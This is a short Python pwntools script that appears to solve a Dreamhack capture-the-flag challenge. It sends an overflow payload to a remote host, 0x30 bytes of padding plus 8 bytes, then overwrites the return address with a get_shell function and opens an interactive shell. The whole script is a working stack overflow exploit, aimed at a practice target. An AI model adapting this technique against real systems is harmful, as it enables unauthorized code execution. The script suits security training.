from pwn import *
import time

#p = process("./rao")
p = remote('host1.dreamhack.games', 11352)

get_shell = 0x4006aa

payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(get_shell)

p.sendline(payload)

p.interactive()
